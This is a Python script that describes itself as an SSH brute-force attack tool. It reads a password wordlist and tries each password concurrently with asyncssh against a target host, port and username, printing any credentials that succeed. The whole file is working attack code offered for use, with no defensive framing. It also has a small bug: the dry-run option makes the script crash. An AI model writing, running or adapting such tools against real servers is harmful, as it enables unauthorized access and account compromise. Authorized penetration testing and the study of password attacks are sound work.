import asyncio
import asyncssh
import argparse
from termcolor import colored
from datetime import datetime
from os import path
from sys import exit


def get_args():
    parser = argparse.ArgumentParser(description="SSH brute-force attack script.")
    parser.add_argument("--host", required=True)
    parser.add_argument('-u', '--username', dest='username', required=True)
    parser.add_argument("--password-file", required=True)
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()
    if args.dry_run:
        print("Dry run mode enabled. Options set:")
        print(f"Host: {args.host}\nUsername: {args.username}\nPassword file: {args.password_file}\nPort: {args.port}")
        return None
    return args


async def ssh_bruteforce(hostname, username, password, port, found_flag):
    """Takes password,username,port as input and checks for connection"""
    try:
        async with asyncssh.connect(hostname, username=username, password=password, port=port) as conn:
            found_flag.set()
            print(colored(
                f"[{port}] [ssh] host:{hostname}  login:{username}  password:{password}", 'green'))

    except Exception as err:
        print(
            f"[Attempt] target {hostname} - login:{username} - password:{password}")


async def main(hostname, port, username, password_file):
    """The Main function takes hostname,port, username,password_file Defines concurrency limit and sends taks to ssh_bruteforce function"""
    tasks = []
    passwords = []
    found_flag = asyncio.Event()
    concurrency_limit = 10
    counter = 0
    with open(password_file, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            passwords.append(password)

    for password in passwords:
        if counter >= concurrency_limit:
            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            tasks = []
            counter = 0

        if not found_flag.is_set():
            tasks.append(asyncio.create_task(ssh_bruteforce(
            hostname, username, password, port, found_flag)))

            await asyncio.sleep(0.5)
            counter += 1

    await asyncio.gather(*tasks)

    if not found_flag.is_set():
        print(colored("\n [-] Failed to find the correct password.", "red"))

if __name__ == "__main__":

    arguments = get_args()

    if not path.exists(arguments.password_file):
        print(colored(
            "[-] password_file location is not right,\n[-] Provide the right path of the password_file", 'red'))
        exit(1)

    print("\n---------------------------------------------------------\n---------------------------------------------------------")
    print(colored(f"[*] Host\t: ", "light_red",), end="")
    print(arguments.host)
    print(colored(f"[*] Username\t: ", "light_red",), end="")
    print(arguments.username)

    print(colored(
        f"[*] Port\t: ", "light_red"), end="")
    print('22' if not arguments.port else arguments.port)

    print(
        colored(f"[*] password_file\t: ", "light_red"), end="")
    print(arguments.password_file)

    print(colored(f"[*] Protocol\t: ", "light_red"), end="")
    print("SSH")

    print("---------------------------------------------------------\n---------------------------------------------------------", )

    print(colored(
        f"SSH-Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
    print("---------------------------------------------------------\n---------------------------------------------------------")

    asyncio.run(main(arguments.host, arguments.port,
                arguments.username, arguments.password_file))
